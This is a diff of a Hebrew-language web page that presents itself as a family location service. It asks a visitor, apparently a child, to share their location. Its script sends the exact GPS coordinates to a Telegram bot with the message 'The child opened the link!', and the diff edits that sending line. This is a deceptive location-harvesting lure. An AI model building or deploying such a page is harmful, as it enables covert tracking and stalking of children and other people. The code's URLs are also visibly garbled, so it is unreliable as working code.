@@ -20,7 +20,6 @@
     <h1>מערכת איתור משפחתית</h1>
     <p>כדי לעדכן את ההורים במיקומך המדויק, לחץ על הכפתור הירוק למטה ואשר את בקשת המיקום שתוצג על המסך.</p>
     
-    <!-- הכפתור שמפעיל את הקוד המשודרג -->
     <button class="btn" onclick="askGPS()">📍 לחץ כאן לשיתוף מיקום</button>
     
     <div id="status" class="status"></div>
@@ -56,10 +55,9 @@
         const mapsLink = `https://google.com{lat},${lon}`;
         const message = encodeURIComponent(`🚨 הילד פתח את הקישור!\n📍 מיקום: ${mapsLink}\n🎯 רמת דיוק: ${accuracy} מטרים.`);
 
-        // בניית הקישור שמכריח את הדפדפן להעביר את המידע לטלגרם בלי חסימות
-        const finalUrl = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+        // הכתובת המתוקנת והמדויקת ללא שגיאות כתובת
+        const finalUrl = 'https://telegram.org' + TELEGRAM_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + message;
         
-        // מעבר מיידי שמפעיל את השרת
         window.location.href = finalUrl;
     }
 
